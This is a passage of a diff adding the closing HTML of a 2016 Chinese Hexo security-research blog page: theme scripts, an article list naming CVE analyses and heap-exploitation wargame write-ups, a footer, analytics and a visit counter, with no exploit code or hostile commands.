+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/01/27/frame-faking/" title="上一篇: frame-faking-介绍-函数调用伪造">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2015/12/12/图解DWORDSHOOT/" title="下一篇: 图解DWORDSHOOT">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/04/29/CVE-2016-1749内核代码执行POC分析/">CVE-2016-1749内核代码执行POC分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/19/CVE-2016-1757利用程序分析/">CVE-2016-1757利用程序分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/18/apple沙盒研究之基础知识/">apple沙盒研究之基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/13/利用patch绕过kextload对内核签名的检测/">利用patch绕过kextload对内核签名的检测</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/03/CVE-2016-1757简单分析/">CVE-2016-1757简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/OSX内核加载mach-o流程分析/">OSX内核加载mach-o流程分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/fishhook源码分析/">fishhook源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/16/dyld源码分析load/">dyld源码分析-动态加载load</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/10/Mach-O的动态链接/">Mach-O的动态链接相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/mach-o文件格式分析/">mach-o格式分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/03/CVE-2016-0799简单分析/">CVE-2016-0799简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/dyld中macho加载的简单分析/">dyld中mach-o文件加载的简单分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/OS-X-内核研究-基础知识/">OS X 内核研究 准备知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/23/通过fusion level02浅谈exploit中的函数调用伪造/">通过fusion level02浅谈exploit中的函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/19/CVE-2015-7547分析与调试/">对CVE-2015-7547简单的分析与调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/09/CVE-2016-1879调试&分析/">CVE-2016-1879 调试&分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/01/27/frame-faking/">frame-faking-介绍-函数调用伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/12/图解DWORDSHOOT/">图解DWORDSHOOT</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap2/">protostar详细解析 heap2 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/09/protostar-heap1/">protostar详细解析 heap1 解答</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/04/栈溢出练习小结/">wargame简单入门</a></li></ul>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2016 mrh
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >本站到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 21;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-71141416-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+  </div>
+</body>
+</html>
